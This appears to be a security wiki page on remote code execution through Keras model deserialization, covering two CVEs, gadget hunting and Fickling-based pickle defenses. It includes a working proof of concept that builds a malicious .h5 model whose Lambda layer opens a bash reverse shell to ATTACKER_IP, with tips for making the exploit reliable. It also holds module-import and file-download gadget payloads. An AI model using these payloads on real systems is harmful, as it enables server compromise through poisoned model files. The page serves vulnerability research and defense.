# Keras Model Deserialization RCE and Gadget Hunting

{{#include ../../banners/hacktricks-training.md}}

This page summarizes practical exploitation techniques against the Keras model deserialization pipeline, explains the native .keras format internals and attack surface, and provides a researcher toolkit for finding Model File Vulnerabilities (MFVs) and post-fix gadgets.

## .keras model format internals

A .keras file is a ZIP archive containing at least:<sup>[[1]](#references)</sup>
- metadata.json – generic info (e.g., Keras version)
- config.json – model architecture (primary attack surface)
- model.weights.h5 – weights in HDF5

The config.json drives recursive deserialization: Keras imports modules, resolves classes/functions and reconstructs layers/objects from attacker-controlled dictionaries.<sup>[[1]](#references)</sup>

Example snippet for a Dense layer object:

```json
{
  "module": "keras.layers",
  "class_name": "Dense",
  "config": {
    "units": 64,
    "activation": {
      "module": "keras.activations",
      "class_name": "relu"
    },
    "kernel_initializer": {
      "module": "keras.initializers",
      "class_name": "GlorotUniform"
    }
  }
}
```

Deserialization performs:<sup>[[1]](#references)</sup>
- Module import and symbol resolution from module/class_name keys
- from_config(...) or constructor invocation with attacker-controlled kwargs
- Recursion into nested objects (activations, initializers, constraints, etc.)

Historically, this exposed three primitives to an attacker crafting config.json:<sup>[[1]](#references)</sup>
- Control of what modules are imported
- Control of which classes/functions are resolved
- Control of kwargs passed into constructors/from_config

## CVE-2024-3660 – Lambda-layer bytecode RCE

Root cause:
- Legacy Lambda deserialization reconstructed a Python function from attacker-controlled marshaled code: `func_load()` base64-decodes the payload, calls `marshal.loads()`, and creates a `FunctionType`. The resulting function's bytecode runs when the Lambda is invoked, and affected pre-2.13 loaders did not enforce safe-mode checks for legacy formats.<sup>[[3]](#references)[[16]](#references)[[17]](#references)[[18]](#references)</sup>

In a native Keras v3 archive, the Lambda function is represented as a `__lambda__` object whose `code` field contains base64-encoded marshaled code:<sup>[[17]](#references)[[18]](#references)</sup>

```json
{
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "exploit_lambda",
    "function": {
      "class_name": "__lambda__",
      "config": {
        "code": "<base64(marshal.dumps(function.__code__))>",
        "defaults": null,
        "closure": null
      }
    }
  }
}
```

Mitigation:
- Keras enforces `safe_mode=True` by default for the native Keras v3 format. Serialized Python lambdas in `Lambda` are blocked unless a user explicitly opts out with `safe_mode=False`; this protection does not cover legacy formats in the same way.<sup>[[1]](#references)[[16]](#references)[[17]](#references)</sup>

Notes:
- Legacy formats (older HDF5 saves) or older codebases may not enforce modern checks, so “downgrade” style attacks can still apply when victims use older loaders.

## CVE-2025-1550 – Arbitrary module import in Keras 3.0.0–3.8.x

Root cause:
- `_retrieve_class_or_fn` used `importlib.import_module(module)` on attacker-controlled module strings from `config.json`.
- Impact: A crafted `.keras` archive could make `Model.load_model()` import attacker-selected Python modules and functions, with import-time side effects and attacker-controlled arguments, even with `safe_mode=True`.<sup>[[1]](#references)[[4]](#references)</sup>

Exploit idea:

```json
{
  "module": "maliciouspkg",
  "class_name": "Danger",
  "config": {"arg": "val"}
}
```

Security improvements (Keras ≥ 3.9):<sup>[[1]](#references)[[2]](#references)</sup>
- Module allowlist: imports restricted to official ecosystem modules: keras, keras_hub, keras_cv, keras_nlp
- Safe mode default: safe_mode=True blocks unsafe Lambda serialized-function loading
- Basic type checking: deserialized objects must match expected types

## Practical exploitation: TensorFlow-Keras HDF5 (.h5) Lambda RCE

Legacy TensorFlow-Keras deployments may still accept HDF5 model files (`.h5`). If an attacker can upload a model that the server later loads or runs inference on, an affected loader can deserialize a Lambda layer containing attacker-controlled Python, which can then execute in the application's model workflow.<sup>[[3]](#references)[[7]](#references)[[16]](#references)</sup>

Minimal PoC to craft a malicious .h5 whose Lambda executes a reverse shell when the target invokes the model:

```python
import tensorflow as tf

def exploit(x):
    import os
    os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
    return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```

Notes and reliability tips:
- Trigger points vary by format and workflow; the referenced write-up observed the payload execute twice during prediction. Treat side effects as repeatable and make payloads idempotent.<sup>[[7]](#references)</sup>
- Version pinning: match the victim’s TF/Keras/Python to avoid serialization mismatches. For example, build artifacts under Python 3.8 with TensorFlow 2.13.1 if that’s what the target uses.<sup>[[7]](#references)</sup>
- Quick environment replication:

```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```

- Validation: a benign payload like os.system("ping -c 1 YOUR_IP") helps confirm execution (e.g., observe ICMP with tcpdump) before switching to a reverse shell.<sup>[[7]](#references)</sup>

## Post-fix gadget surface inside allowlist

Even with the Keras module allowlist and safe mode, allowed callables can expose side effects. For example, `keras.utils.get_file` downloads a URL and writes it under the configured cache location, making it a candidate for gadget analysis.<sup>[[1]](#references)[[19]](#references)</sup>

Candidate Lambda configuration (validate the call signature in a controlled test):

```json
{
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "dl",
    "function": {
      "module": "keras.utils",
      "class_name": "get_file",
      "config": null,
      "registered_name": null
    },
    "arguments": {
      "origin": "https://example.com/artifact.bin",
      "cache_dir": "/tmp/keras-cache"
    }
  }
}
```

Important limitation:
- `Lambda.call()` always passes the model input as the first positional argument and the configured `arguments` as keyword arguments. For `get_file`, that positional value fills `fname`; a tensor/path mismatch can make this candidate fail before any download, so it is not a guaranteed working gadget.<sup>[[1]](#references)[[16]](#references)[[19]](#references)</sup>

## ML pickle import allowlisting for AI/ML models (Fickling)

Many AI/ML model formats (PyTorch `.pt`/`.pth`/`.ckpt`, joblib/scikit-learn artifacts, and other Python-native formats) embed Python pickle data. The legacy Keras Lambda path above uses marshaled function bytecode instead, so it is a separate deserialization risk. Pickle opcodes can invoke attacker-controlled behavior during deserialization, including model tampering or RCE, and simple scanners can miss novel or unlisted dangerous imports.<sup>[[7]](#references)[[8]](#references)[[14]](#references)[[18]](#references)</sup>

A practical fail-closed defense is to hook Python’s pickle deserializer and only allow a reviewed set of harmless ML-related imports during unpickling. Trail of Bits’ Fickling implements this policy and ships a curated ML import allowlist built from thousands of public Hugging Face pickles.<sup>[[8]](#references)[[13]](#references)</sup>

Security model for “safe” imports (intuitions distilled from research and practice): imported symbols used by a pickle must simultaneously:<sup>[[8]](#references)</sup>
- Not execute code or cause execution (no compiled/source code objects, shelling out, hooks, etc.)
- Not get/set arbitrary attributes or items
- Not import or obtain references to other Python objects from the pickle VM
- Not trigger any secondary deserializers (e.g., marshal, nested pickle), even indirectly

Enable Fickling’s protections as early as possible in process startup so that any pickle loads performed by frameworks (torch.load, joblib.load, etc.) are checked:<sup>[[9]](#references)</sup>

```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```

Operational tips:
- You can temporarily disable/re-enable the hooks where needed:<sup>[[9]](#references)</sup>

```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```

- If a known-good model is blocked, extend the allowlist for your environment after reviewing the symbols:<sup>[[9]](#references)</sup>

```python
fickling.hook.activate_safe_ml_environment(also_allow=[
    "package.subpackage.safe_symbol",
    "another.safe.import",
])
```

- Fickling also exposes generic runtime guards if you prefer more granular control:<sup>[[9]](#references)</sup>
  - fickling.always_check_safety() to enforce checks for all pickle.load()
  - with fickling.check_safety(): for scoped enforcement
  - fickling.load(path) / fickling.is_likely_safe(path) for one-off checks

- Prefer non-pickle model formats when possible (e.g., SafeTensors).<sup>[[15]](#references)</sup> If you must accept pickle, run loaders under least privilege without network egress and enforce the allowlist.

This allowlist-first strategy demonstrably blocks common ML pickle exploit paths while keeping compatibility high. In ToB’s benchmark, Fickling flagged 100% of synthetic malicious files and allowed ~99% of clean files from top Hugging Face repos.<sup>[[8]](#references)[[10]](#references)</sup>


## Researcher toolkit

1) Systematic gadget discovery in allowed modules

Enumerate candidate callables across keras, keras_nlp, keras_cv, keras_hub and prioritize those with file/network/process/env side effects.<sup>[[1]](#references)</sup>

<details>
<summary>Enumerate potentially dangerous callables in allowlisted Keras modules</summary>

```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
    if not hasattr(mod, "__path__"):
        return
    for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
        yield m.name

candidates = []
for root in ALLOWLIST:
    try:
        r = importlib.import_module(root)
    except Exception:
        continue
    for name in iter_modules(r):
        if name in seen:
            continue
        seen.add(name)
        try:
            m = importlib.import_module(name)
        except Exception:
            continue
        for n, obj in inspect.getmembers(m):
            if inspect.isfunction(obj) or inspect.isclass(obj):
                sig = None
                try:
                    sig = str(inspect.signature(obj))
                except Exception:
                    pass
                doc = (inspect.getdoc(obj) or "").lower()
                text = f"{name}.{n} {sig} :: {doc}"
                # Heuristics: look for I/O or network-ish hints
                if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
                    candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```

</details>

2) Direct deserialization testing (no .keras archive needed)

Feed crafted dicts directly into Keras deserializers to learn accepted params and observe side effects.<sup>[[1]](#references)</sup>

```python
import keras

cfg = {
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "probe",
    "function": {
      "module": "keras.utils",
      "class_name": "get_file",
      "config": null,
      "registered_name": null
    },
    "arguments": {
      "origin": "https://example.com/x",
      "cache_dir": "/tmp/keras-cache"
    }
  }
}

layer = keras.saving.deserialize_keras_object(cfg, safe_mode=True)  # Observe behavior
```

3) Cross-version probing and formats

Keras exists in multiple codebases/eras with different guardrails and formats:<sup>[[1]](#references)</sup>
- TensorFlow built-in Keras: tensorflow/python/keras (legacy, slated for deletion)
- tf-keras: maintained separately
- Multi-backend Keras 3 (official): introduced native .keras

Repeat tests across codebases and formats (.keras vs legacy HDF5) to uncover regressions or missing guards.

## References

- [1] [Hunting Vulnerabilities in Keras Model Deserialization (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [2] [Keras PR #20751 – Added checks to serialization](https://github.com/keras-team/keras/pull/20751)
- [3] [CVE-2024-3660 – Keras Lambda deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [4] [CVE-2025-1550 – Keras arbitrary module import (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [5] [huntr report – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [6] [huntr report – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [7] [HTB Artificial – TensorFlow .h5 Lambda RCE to root](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [8] [Trail of Bits blog – Fickling’s new AI/ML pickle file scanner](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [9] [Fickling – Securing AI/ML environments (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [10] [Fickling pickle scanning benchmark corpus](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [11] [Picklescan](https://github.com/mmaitre314/picklescan)
- [12] [ModelScan](https://github.com/protectai/modelscan)
- [13] [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [14] [Sleepy Pickle attacks background](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [15] [SafeTensors project](https://github.com/safetensors/safetensors)
- [16] [CERT/CC VU#253266 – Keras 2 Lambda Layers Allow Arbitrary Code Injection](https://kb.cert.org/vuls/id/253266)
- [17] [Keras Lambda layer source (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/layers/core/lambda_layer.py)
- [18] [Keras Python utilities source (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/utils/python_utils.py)
- [19] [Keras `get_file` API](https://keras.io/api/utils/python_utils/#get_file-function)

{{#include ../../banners/hacktricks-training.md}}
